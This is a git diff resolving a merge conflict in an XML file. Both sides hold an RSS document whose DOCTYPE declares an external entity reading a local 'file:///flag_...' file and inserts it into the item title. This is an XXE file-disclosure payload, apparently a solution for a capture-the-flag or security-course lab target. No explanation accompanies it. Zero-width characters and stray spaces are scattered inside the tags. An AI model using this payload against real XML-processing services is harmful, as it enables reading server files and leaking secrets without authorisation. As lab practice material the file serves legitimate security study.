@@ -1,4 +1,3 @@
-<<<<<<< HEAD
 <?​xml version=​ "1.0"​ encoding=​ "UTF-8"?>
 <!DOCTYPE foo [<!ENTITY ans SYSTEM "file:///flag_8ce21bdecc32791a3fb5bad763ff539b">]>
 <​rss​ version=​ "2.0"​>
@@ -10,18 +9,3 @@
 </​item​>
 </​channel>
 </​rss​>
-=======
-<?​ xml version=​ "1.0"​ encoding=​ "UTF-8"​ ?>
-<!DOCTYPE foo [
-<!ENTITY ans SYSTEM "file:///flag_da77f961dc5d53d0ff1248bfd7049b5a">
-]>
-<​ rss​ version=​ "2.0"​ >
-<​ channel​ >
-<​ item​ >
-<​ title​ > ​ &ans;​ </​ title​ >
-<​ link​ > ​ https://blog.quoccabank.com/?p=42​ </​ link​ >
-<​ description​ > ​ irr​ </​ description​ >
-</​ item​ >
-</​ channel​ >
-</​ rss​ >
->>>>>>> 2c31892b20b181770cae702d25d0b991f6285404
